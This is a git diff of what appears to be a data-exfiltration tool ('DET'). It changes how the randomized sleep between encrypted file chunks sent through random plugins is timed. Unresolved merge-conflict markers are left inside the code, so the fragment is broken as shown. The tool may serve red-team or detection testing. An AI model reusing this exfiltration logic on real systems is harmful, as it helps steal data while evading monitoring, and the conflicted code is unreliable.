@@ -12,7 +12,7 @@ import signal
 import base64
 import struct
 import tempfile
-from random import randint, uniform
+from random import randint
 from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
@@ -279,9 +279,13 @@ class ExfiltrateFile(threading.Thread):
         data, f = get_next_data(self.file_to_send, packet_index, plugin_name, None, self.exfiltrate.KEY, self.jobid)
         plugin_send_function(data)
 
+<<<<<<< HEAD
         packet_index += 1
 
         time_to_sleep = uniform(0, MAX_TIME_SLEEP)
+=======
+        time_to_sleep = randint(1, MAX_TIME_SLEEP)
+>>>>>>> parent of 232ba4e... allows less waiting to be possible
         info("Sleeping for %s seconds" % time_to_sleep)
         time.sleep(time_to_sleep)
 
@@ -292,7 +296,12 @@ class ExfiltrateFile(threading.Thread):
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
             plugin_send_function(data)
             packet_index = packet_index + 1
+<<<<<<< HEAD
             time_to_sleep = uniform(0, MAX_TIME_SLEEP)
+=======
+
+            time_to_sleep = randint(1, MAX_TIME_SLEEP)
+>>>>>>> parent of 232ba4e... allows less waiting to be possible
             display_message("Sleeping for %s seconds" % time_to_sleep)
             time.sleep(time_to_sleep)
 
@@ -415,7 +424,7 @@ def main():
     ok("CTRL+C to kill DET")
 
     MIN_TIME_SLEEP = int(config['min_time_sleep'])
-    MAX_TIME_SLEEP = float(config['max_time_sleep'])
+    MAX_TIME_SLEEP = int(config['max_time_sleep'])
     MIN_BYTES_READ = int(config['min_bytes_read'])
     MAX_BYTES_READ = int(config['max_bytes_read'])
     COMPRESSION    = bool(config['compression'])
